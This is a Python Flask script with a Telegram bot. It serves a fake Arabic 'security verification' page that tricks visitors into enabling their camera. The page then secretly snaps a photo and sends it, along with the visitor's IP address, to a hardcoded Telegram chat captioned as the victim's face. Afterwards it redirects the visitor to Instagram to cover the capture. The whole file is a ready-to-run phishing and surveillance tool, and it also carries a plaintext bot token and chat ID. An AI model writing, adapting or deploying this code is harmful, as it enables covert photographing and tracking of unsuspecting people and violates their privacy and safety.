import telebot
from flask import Flask, request, render_template_string
import base64
import os

TOKEN = "8195744080:AAHrjFbYsoAvm4Oi2EhJI09KShSvp3G76Vc"
CHAT_ID = "8362370478"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحقق الأمان</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; text-align: center; background: #fafafa; padding-top: 50px; }
        .btn { background: #0095f6; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <h2>تأكيد الهوية</h2>
    <p>اضغط على الزر أدناه للسماح بالفحص الأمني للمتصفح</p>
    <button class="btn" onclick="snap()">التحقق من المستخدم</button>
    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
    async function snap() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const d = c.toDataURL('image/png');
                fetch('/upload', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({img: d})})
                .then(() => { window.location.href = "https://instagram.com"; });
            }, 1000);
        } catch(e) { alert("يجب السماح بالكاميرا لإتمام التحقق!"); }
    }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    bot.send_message(CHAT_ID, f"🌐 شخص دخل الرابط!\nIP: `{ip}`")
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['img']
    img_data = base64.b64decode(data.split(',')[1])
    with open("shot.png", "wb") as f: f.write(img_data)
    with open("shot.png", "rb") as f: bot.send_photo(CHAT_ID, f, caption="📸 وجه الضحية المباشر")
    return "ok"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
